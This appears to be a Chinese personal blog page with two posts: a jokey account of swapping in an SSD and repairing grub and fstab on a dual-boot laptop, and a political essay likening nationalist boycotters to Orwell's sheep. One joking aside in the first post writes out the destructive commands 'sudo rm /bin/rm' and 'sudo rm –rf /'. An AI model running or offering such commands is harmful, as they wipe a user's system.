  </div>
  
</article>



  
    <article id="post-ssd/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/03/25/ssd/index/" class="article-date">
  <time class="dt-published" datetime="2017-03-25T00:00:00.000Z" itemprop="datePublished">2017-03-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/it/">it</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/03/25/ssd/index/">换固态的那点事</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>俗话说，前人种(wā)树(kēng)，后人乘(tiào)凉(kēng)。</p>
<p>昨天下午的时候，有幸和<a target="_blank" rel="noopener" href="https://mingyueli.com/">小蜗牛</a>童鞋一起换了固态硬盘。俗话说得好，<strong>想要装逼的时候却总是失败</strong>。咱就把下午的事说一说，总结下吧</p>
<p>俺呐，是双系统，已经用True Image备份了Windows和Ubuntu，放在了即将变成移动硬盘的那个硬盘里。（Ubuntu自带的备份工具简直狗屎，还不如我自己tar jcpvf呢）</p>
<p>首先来看下我准备工具。</p>
<p><img src="/images/032517_0253_1.jpg"> 哇，一整套螺丝刀，一个专门用来翘边的小东西（还有一张废弃的会员卡作为备用），移动硬盘盒。可谓装备齐全啊。</p>
<p>哎小蜗牛童鞋你瞧哈。这个是硬盘，CPU，GPU（显卡），这个是无线网卡，这个是右侧坏掉的USB，始终没修好……这个是内存，两边往下一按就能弹出来了，下面的是4G的手里的是8G的（我的手那个抖啊太激动了），总之就是一顿介绍嘛。</p>
<p><a target="_blank" rel="noopener" href="https://o51bfbumd.qnssl.com/motherboard.jpg"><img src="/images/motherboard.jpg"></a></p>
<p>咱的目标就是，把主硬盘放到光驱位上，再把固态放到原来的硬盘上。为啥要这么折腾呢？因为华硕它抠门啊，光驱位就给3Gb&#x2F;s，硬盘位才是6Gb&#x2F;s，咱怎么能让传输速率称为性能的瓶颈呢？（麻利的拿起螺丝刀要去扭硬盘托盘的螺丝，越来越觉得不对劲，哎这玩意怎么这么难拧？后来发现太激动了应该拧右侧的固定螺丝）<img src="/images/032517_0253_3.jpg"></p>
<p>好吧固态咱装完了，上盖开机恢复系统吧。咦？好像少了点什么？对，应该测试完再上盖的！<img src="/images/032517_0253_4.jpg"></p>
<p>（“这手真嫩啊”，别看了就说你呢）</p>
<p>滴滴滴！老司机竟然有报警声。什么情况？开盖！使用<strong>排除法</strong>，先拿了机械硬盘，再拿了固态，依旧滴滴滴。莫非…内存问题？把内存拔了重新插，哎嘿还真是。我……草泥马都hold不住了。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/03/2017032503145693.png"><img src="/images/2017032503145693.png"></a></p>
<p>然后咱只剩下两个任务了，恢复系统</p>
<p>拿True Image恢复备份，咱得先把旧硬盘搞成移动硬盘啊。</p>
<p>竟然没法扣盖（晚上才发现我正反面弄错了），插上USB口，竟然咔咔咔的不转！啥情况？换到USB2.0好了……敢情这丫是嫌弃我电压高啊？ 当然啦，EFI分区什么的咱都先创建好呢。</p>
<h2 id="恢复Windows"><a href="#恢复Windows" class="headerlink" title="恢复Windows"></a>恢复Windows</h2><p>方法就是，用True Image恢复备份到固态硬盘，然后修复引导。</p>
<p>不知为何竟然修复失败，固态硬盘里的文件也都没有权限。奇怪了我也没开EFS、BitLocker啊。</p>
<p>那就重装Windows 10吧，然后再用True Image恢复。成功。</p>
<h2 id="恢复Ubuntu"><a href="#恢复Ubuntu" class="headerlink" title="恢复Ubuntu"></a>恢复Ubuntu</h2><p>恢复Ubuntu的方法挺多的。仿造Windows，用U盘重装Ubuntu，然后True Image恢复。果不其然，grub rescue了。这就给我了一个学习的机会，咋应对grub rescue呢……</p>
<p>咱Linux就是好玩，咱运行时就能备份，哪像瘟斗士嘛……</p>
<p>[v_blue]“信不信我能把rm给rm了(<code>sudo rm /bin/rm</code>)？信不信我自杀给你看（<code>sudo rm –rf /</code>）？信不信我把你<a target="_blank" rel="noopener" href="https://www.reddit.com/r/linux/comments/43ls7j/no_post_after_rm_rf_systemd_uefi/">固件毁了？</a>“窝在角落里的Linux发行版说到。 “这不是我的锅，我不背”Systemd和MSI一同忧郁的说到。[&#x2F;v_blue]</p>
<p>先说下我的环境吧。UEFI+GPT，SSD被Linux识别成sdb，sdb1是EFI分区，sdb2的Windows，sdb3是ext4的&#x2F;，所以咱grub rescue咱这么干呐</p>
<p>set prefix&#x3D;(hd1,gpt3)&#x2F;boot&#x2F;grub&#x2F;<br>set root&#x3D;(hd1,gpt3)<br>insmod normal<br>normal</p>
<p><img src="/images/032517_0253_5.jpg"></p>
<p>这四句话的意思就是让grub知道该去哪里找各种启动过程中必须的文件，输入最后一个<code>normal</code>的时候，应该就见到了常见的grub引导界面，此时选择Ubuntu，等那么几分钟……哎嘿，<code>emergency mode</code>了。为啥呢？因为内核无法挂载文件系统啊。为啥无法挂载啊？因为……</p>
<p>别说了咱看下<code>/etc/fstab</code>吧，果然啊……磁盘的UUID改了，知道病因那就好办了。要么用<code>blkid</code>看下新的UUID，把fstab改正确了，要么直接用<code>/dev/sdb1</code>这种形式</p>
<p>看我改动的痕迹！</p>
<p><img src="/images/032517_0253_6.png"></p>
<p>然后就都正常啦。不过重启依旧会grub rescue。不怕，咱进Ubuntu装个boot-repair或者<code>grub-install</code>，就可以啦。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>感谢可爱的小蜗牛童鞋的拍照、看管螺丝和数不清的❤</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/03/25/ssd/index/" data-id="clhp7rtk7008ys2qr9bugav4g" data-title="换固态的那点事" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-sheep-idiot/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/03/10/sheep-idiot/index/" class="article-date">
  <time class="dt-published" datetime="2017-03-10T00:00:00.000Z" itemprop="datePublished">2017-03-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/china/">china</a>►<a class="article-category-link" href="/categories/china/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/03/10/sheep-idiot/index/">拿破仑的羊</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在<a target="_blank" rel="noopener" href="https://dmesg.app/takedown-on-github.html">GitHub government takedown on programthink&#x2F;zhao</a>时，我曾经说自己有点过气。今天再次说自己过气，这事都过去了十几天了，我才开始写，要么就是反映迟钝，要么就是大器晚成吧，我觉得还是前者更好吧。</p>
<h2 id="拿破仑"><a href="#拿破仑" class="headerlink" title="拿破仑"></a>拿破仑</h2><p>这个拿破仑啊，不是那个想当将军的士兵；这个拿破仑啊，来源于乔治奥威尔<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E7%89%A9%E5%BA%84%E5%9B%AD">《动物农场》</a>。</p>
<p>动物农场的情节其实基本上可以说是在影射俄国十月革命至斯大林时代的苏联。 首先呐，动物们在人类的统治下生活苦不堪言，一头猪在提出了“人类剥削牲畜，牲畜须革命”的理论之后死去，若干年后农场里掀起了一场由猪领导的革命，原来的剥削者——农场主人被赶走，牲畜们实现了“当家作主”的愿望，尝到了革命的成果，农场更名为“动物庄园”并且制定了庄园的宪法——“七诫”。 但不久后领导革命的猪们发生了分裂，一头猪被宣布为革命的敌人。此后，获取了领导权的猪拥有了越来越大的权力和越来越多的优厚待遇，逐渐脱离了其他动物，最终变成和人类完全一样的牲畜剥削者，动物庄园的名字也被放弃。 在最后，其它的动物已经认为猪和原本的人类剥削者没有差别，分不清楚究竟哪个是人，哪个是猪了。</p>
<h2 id="羊群"><a href="#羊群" class="headerlink" title="羊群"></a>羊群</h2><p>在《动物农场》中，有一个角色特别让人感到无奈与可笑，就是那群羊：他们盲目追随拿破仑，阻止反对拿破仑的声音。最开始一直在说“<strong>四条腿好，两条腿坏</strong>”后来变成了“<strong>四条腿好，两条腿更好</strong>”而丝毫不觉得矛盾。 羊群代表盲从政治宣传的无知民众。而今天我们要说的就是，羊群，生活在我们身边的羊群。</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>事情的起因也很简单，就是乐天把自家的地与韩国政府<strong>进行交换</strong>部署萨德，之后大陆官方和民众反韩、抵制乐天的行为便如“雨后春笋”般涌现出来。咱啊，不打算讨论萨德是个什么玩意，韩国为啥要部署萨德，为啥韩国民众游行抗议，为啥抵制韩国不抵制俄罗斯，为啥乐天和韩国政府是做交易而不是征地，金正男是咋死的，朝鲜又射了几枚导弹，是谁纵容朝鲜的，这些咱通通都不谈，这些咱留给那些热血青年们自己反思。咱今天只要谈谈脑残们的故事：过去了这么多年，脑残没变少反而<strong>变多、变得更严重</strong>了。</p>
<h2 id="四年前的钓鱼岛"><a href="#四年前的钓鱼岛" class="headerlink" title="四年前的钓鱼岛"></a>四年前的钓鱼岛</h2><p>大概四年前，因为钓鱼岛而引发的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/2012%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%8F%8D%E6%97%A5%E7%A4%BA%E5%A8%81%E6%B4%BB%E5%8A%A8">反日游行</a>大家应该还记得些吧。 如果大家回忆下，是否记得那个<a target="_blank" rel="noopener" href="https://theinitium.com/article/20161123-mainland-lijianli/">开丰田的至今生活不能自理</a>的可怜人？ 很抱歉这只不过是历史重演，是谁说的“历史总是惊人的相似”，是啊，<a target="_blank" rel="noopener" href="https://twitter.com/CorndogCN/status/811022925805424640">永远不知道吸取教训</a>历史不相似也只能全等了。</p>
<h2 id="脑残的养成"><a href="#脑残的养成" class="headerlink" title="脑残的养成"></a>脑残的养成</h2><p>人民日益减弱的智商同先进的洗脑教材之间的矛盾</p>
<h3 id="错误敏感的G点"><a href="#错误敏感的G点" class="headerlink" title="错误敏感的G点"></a>错误敏感的G点</h3><p>在春节期间，我曾写过一篇文章<a target="_blank" rel="noopener" href="https://dmesg.app/gspot.html">《天朝民众的敏感G点》</a> 其中主要分析了G点的形成，提到了一些心理学概念。提到了洗脑教育、选择性失察、一致性原则等。但是……</p>
<h3 id="双重思想"><a href="#双重思想" class="headerlink" title="双重思想"></a>双重思想</h3><p>除了G点的那些，还有一个非常著名的词语叫做“双重思想（Doublethink）”，别想了这话也是奥威尔首创的。双重思想是啥意思呢，就是同时接受两种相违背的信念的行为，然后内心还不觉得矛盾。好像是不是有些熟悉？比如说： 一边说中华民族是最伟大、最优秀的民族；一边说中国人的素质太低，不适合民主。 一边说人多力量大英雄母亲；一边说强制一胎严惩二胎。 再近一点，那些羊群们不就是先说“四条腿好，两条腿坏”而后说“四条腿好，两条腿更好”吗？还有数次改动的“七诫 ”。 用奥威尔的话说，对于统治阶层，双重思想也同样很重要：</p>
<blockquote>
<p>知与不知，知道全部真实情况而却扯些滴水不漏的谎话，同时持两种互相抵消的观点，明知它们互相矛盾而仍都相信，用逻辑来反逻辑，一边表示拥护道德一边又否定道德，一边相信民主是办不到的一边又相信党是民主的捍卫者，忘掉一切必须忘掉的东西而又在需要的时候想起它来，然后又马上忘掉它，而尤其是，把这样的做法应用到做法本身上面——这可谓绝妙透顶了：有意识地进入无意识，而后又并不意识到你刚才完成的催眠。即使要了解“双重思想”的含义你也得使用双重思想。</p>
</blockquote>
<h3 id="拿破仑的羊与天朝的脑残"><a href="#拿破仑的羊与天朝的脑残" class="headerlink" title="拿破仑的羊与天朝的脑残"></a>拿破仑的羊与天朝的脑残</h3><p>拿破仑手下的羊，倒是和脑残很多相似的地方，不会思考，盲从领导。每当有人试图抗议，他们都会大唱“四条腿好，两条腿坏”来阻碍他们；每当局势变化，他们总是坚定不移的占到拿破仑一边。别以为这样就能万事大吉了，该被拆还是被拆，棋子用完了就扔这个道理谁不懂。 历史总是惊人的相似，嘿嘿嘿……</p>
<h2 id="避免成为脑残"><a href="#避免成为脑残" class="headerlink" title="避免成为脑残"></a>避免成为脑残</h2><p>至于成为脑残有何坏处，这大概不用说吧。<strong>丧失自己的思考能力</strong>，沦为附庸，被利用；恰如羊群只是拿破仑的棋子一样，作为脑残，也只是朝廷的工具，只不过是转移国内矛盾的工具而已。 如何避免成为脑残？其实说简单也简单，说复杂也复杂：<a target="_blank" rel="noopener" href="https://dmesg.app/other-than-tech.html">自由思想、独立思考、批判性思维</a></p>
<h2 id="可笑的行为"><a href="#可笑的行为" class="headerlink" title="可笑的行为"></a>可笑的行为</h2><p>要么没人敢欺负我；要么你欺负我，我欺负你；要么你欺负我，我兄弟欺负你；最不济也是你欺负我，我欺负你兄弟；从来没听说过你欺负我，我欺负我兄弟这种模式。 这句话是几年前还在写博客的韩寒说的，这么多年过去了，看起来还是如此讽刺。</p>
<h2 id="荒唐的抵制"><a href="#荒唐的抵制" class="headerlink" title="荒唐的抵制"></a>荒唐的抵制</h2><p>咱都是自私的，什么事肯定会下意识的本能的去保护自己，所以咱首先就要关心咱自己的利益和生命安全的问题。 你该抵制什么？很显然，雾霾要抵制，毒食品要抵制，污染要抵制，垃圾教育要抵制，医疗问题要抵制，天价房产要抵制。 可是脑残们并没有这么做，脑残们选择了去捏方便面、去砸车抢超市。<strong>选择性失察和双重思想</strong>再次发挥了无与伦比的作用。因为脑残们知道抵制雾霾等有危险。他妈的不敢！连个屁都不敢放！</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本文篇章结构并不是很完整，逻辑性也略有欠缺，也许是因为：</p>
<p>只是坐在窗前，搜寻你的身影。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/03/10/sheep-idiot/index/" data-id="clhp7rtju008ms2qrchw98ijd" data-title="拿破仑的羊" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/13/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/15/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/china/">china</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/china/justsay/">justsay</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/cloudflare/">cloudflare</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/">it</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/it/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/">justsay</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/website/">website</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/program/">program</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/program/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/share/">share</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/website/">website</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/website/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/what/">what</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/what/gfw/">gfw</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/12/31/2023-end/index/">2023 年终总结</a>
          </li>
        
          <li>
            <a href="/2023/12/09/tron-trx/index/">使用 Tron(TRX) 收款</a>
          </li>
        
          <li>
            <a href="/2023/11/26/nodejs-dual-stack/index/">Node.js 18升级：双栈协议踩坑</a>
          </li>
        
          <li>
            <a href="/2023/11/25/steam-deck-stuck/index/">Steam Deck 启动游戏卡 logo</a>
          </li>
        
          <li>
            <a href="/2023/11/09/es-ee-se-unicode/index/">Unicode编码之谜：为什么🇪🇸🇪🇪包含了🇸🇪？</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 Benny小土豆<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>